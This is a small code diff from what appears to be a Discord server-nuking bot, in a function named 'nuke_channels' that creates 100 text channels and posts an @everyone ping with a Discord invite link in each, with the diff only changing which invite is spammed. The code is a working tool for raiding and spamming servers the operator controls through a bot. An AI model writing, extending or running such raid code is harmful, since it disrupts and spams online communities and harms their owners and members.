@@ -25,7 +25,7 @@ async def nuke_channels(guild):
         for i in range(1, 101):
             channel_name = f"Channel-{i}"
             new_channel = await guild.create_text_channel(channel_name)
-            await new_channel.send("@everyone https://discord.gg/petgwhadap")
+            await new_channel.send("@everyone https://discord.gg/kXyt3TXA9b")
             await asyncio.sleep(0.6)  # Adding a delay between channel creations
     except discord.Forbidden:
         print("Missing permissions to perform channel operations.")
